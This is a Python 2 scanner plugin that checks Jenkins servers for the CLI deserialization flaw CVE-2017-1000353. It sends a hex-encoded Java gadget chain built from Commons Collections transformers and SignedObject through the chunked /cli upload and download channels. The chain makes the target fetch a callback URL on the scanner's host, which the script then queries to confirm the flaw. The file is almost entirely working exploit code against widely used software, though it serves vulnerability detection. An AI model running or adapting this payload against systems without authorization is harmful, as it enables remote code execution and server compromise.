# coding:utf-8
import socket
import uuid
import random
import urllib2
import time
import threading

def get_plugin_info():
    plugin_info = {
        "name": "Jenkins-CLI反序列化代码执行(CVE-2017-1000353)",
        "info": "Jenkins-CLI反序列化代码执行,CVE-2017-1000353,攻击者通过此漏洞可以直接获取系统权限，导致服务器被入侵控制。",
        "level": "紧急",
        "type": "代码执行",
        "author": "d33.n99@gmail.com",
        "url": "https://jenkins.io/security/advisory/2017-04-26/",
        "keyword": "tag:jenkins",
        "source": 1
    }
    return plugin_info


def random_str(len):
    str1 = ""
    for i in range(len):
        str1 += (random.choice("ABCDEFGH1234567890"))
    return str(str1)


def get_ver_ip(ip):
    csock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    csock.connect((ip, 80))
    (addr, port) = csock.getsockname()
    csock.close()
    return addr

def download(url, session):
    try:
        headers = {'Connection':'keep-alive', 'Accept':'*/*', 'Transfer-Encoding':'chunked', 'Session':session, 'Content-type':'application/x-www-form-urlencoded', 'Side':'download'}
        urllib2.urlopen(urllib2.Request(url, headers=headers, data = "\r\n\r\n")).read()
    except:pass


def check(ip, port, timeout):
    try:
        session = str(uuid.uuid4())
        urllib2.socket.setdefaulttimeout(timeout)
        dnsserver = get_ver_ip(ip)
        ramdmum = random_str(6 + 15 - len(dnsserver))
        URL = ("http://%s:%d/cli" % (ip, port))
        t = threading.Thread(target=download, args=(URL, session))
        t.start()
        time.sleep(1)
        headers = {'Connection':'keep-alive', 'Accept':'*/*', 'Transfer-Encoding':'chunked', 'Session':session, 'Cache-Control':'no-cache', 'Content-type':'application/octet-stream', 'Side':'upload'}
        payload = '0d0a37370d0a3c3d3d3d5b4a454e4b494e532052454d4f54494e472043415041434954595d3d3d3d3e724f304142584e794142706f6457527a62323475636d567462335270626d63755132467759574a7062476c3065514141414141414141414241674142536741456257467a6133687741414141414141414148343d0d0a340d0a000000000d0a3961650d0aaced00057372002f6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e5265666572656e63654d61701594ca03984908d7030000787077110000000000000001003f40000000000010737200286a6176612e7574696c2e636f6e63757272656e742e436f70794f6e577269746541727261795365744bbdd092901569d70200014c0002616c74002b4c6a6176612f7574696c2f636f6e63757272656e742f436f70794f6e577269746541727261794c6973743b7870737200296a6176612e7574696c2e636f6e63757272656e742e436f70794f6e577269746541727261794c697374785d9fd546ab90c303000078707704000000027372002a6a6176612e7574696c2e636f6e63757272656e742e436f6e63757272656e74536b69704c697374536574dd985079bdcff15b0200014c00016d74002d4c6a6176612f7574696c2f636f6e63757272656e742f436f6e63757272656e744e6176696761626c654d61703b78707372002a6a6176612e7574696c2e636f6e63757272656e742e436f6e63757272656e74536b69704c6973744d6170884675ae061146a70300014c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b7870707372001a6a6176612e73656375726974792e5369676e65644f626a65637409ffbd682a3cd5ff0200035b0007636f6e74656e747400025b425b00097369676e617475726571007e000e4c000c746865616c676f726974686d7400124c6a6176612f6c616e672f537472696e673b7870757200025b42acf317f8060854e002000078700000054caced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e000378707672000c6a6176612e6e65742e55524c962537361afce47203000749000868617368436f6465490004706f72744c0009617574686f726974797400124c6a6176612f6c616e672f537472696e673b4c000466696c6571007e00124c0004686f737471007e00124c000870726f746f636f6c71007e00124c000372656671007e001278707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d6571007e00125b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c020000787000000001757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a99020000787000000001767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb342020000787074000e676574436f6e7374727563746f727571007e001a000000017671007e001a7371007e00147571007e001800000001757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b47020000787000000001740026687474703a2f2f3235352e3235352e3235352e3235353a383038382f6164642f72616e646f6d74000b6e6577496e7374616e63657571007e001a000000017671007e00187371007e00147571007e00180000000074000a6f70656e53747265616d7571007e001a000000007371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f40000000000000770800000010000000007878787571007e00110000002e302c02140a665ea0697942e464f2eb42fc2ee4cffe6bda1002142690cdb27f41817c332fdea1526b801b779d321f740003445341737200116a6176612e6c616e672e426f6f6c65616ecd207280d59cfaee0200015a000576616c75657870017078737200316f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e7365742e4c6973744f726465726564536574fcd39ef6fa1ced530200014c00087365744f726465727400104c6a6176612f7574696c2f4c6973743b787200436f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e7365742e416273747261637453657269616c697a61626c655365744465636f7261746f72110ff46b96170e1b0300007870737200156e65742e73662e6a736f6e2e4a534f4e41727261795d01546f5c2872d20200025a000e657870616e64456c656d656e74734c0008656c656d656e747371007e0018787200186e65742e73662e6a736f6e2e41627374726163744a534f4ee88a13f4f69b3f82020000787000737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000017704000000017400076a656e6b696e7378787371007e001e00000000770400000000787871007e00207371007e00027371007e000577040000000271007e001a71007e00097871007e002070780d0a300d0a0d0a'.decode('hex')
        payload = payload.replace('http://255.255.255.255:8088/add/random', 'http://' + dnsserver +':8088/add/' + ramdmum)
        urllib2.urlopen(urllib2.Request(URL, headers=headers, data=payload))
        time.sleep(5)
        req = urllib2.Request("http://%s:8088/check/%s" % (dnsserver, ramdmum));
        reqopen = urllib2.urlopen(req)
        if "YES" in reqopen.read():
            return u"存在Jenkins反序列化漏洞(CVE-2017-1000353)"
    except:
        pass
